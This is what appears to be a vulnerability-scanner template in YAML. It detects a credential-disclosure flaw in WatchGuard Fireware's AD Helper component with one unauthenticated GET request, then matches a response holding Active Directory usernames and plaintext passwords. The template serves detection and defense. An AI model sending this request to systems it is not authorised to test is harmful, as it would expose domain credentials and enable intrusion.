id: watchguard-credentials-disclosure
name: WatchGuard Fireware AD Helper Component - Credentials Disclosure
severity: critical
confidence: tentative
description: WatchGuard Fireware Threat Detection and Response (TDR) service contains a credential-disclosure vulnerability
  in the AD Helper component that allows unauthenticated attackers to gain Active Directory credentials for a Windows domain
  in plaintext.
reference: CWE-288
tags:
- watchguard
- disclosure
- edb
- vuln
requests:
- method: GET
  path: /rest/domains/list?sortCol=fullyQualifiedName&sortDir=asc
  matchers:
  - type: body
    words:
    - '"fullyQualifiedName"'
    - '"logonDomain"'
    - '"username"'
    - '"password"'
  - type: status
    status:
    - 200
  condition: and
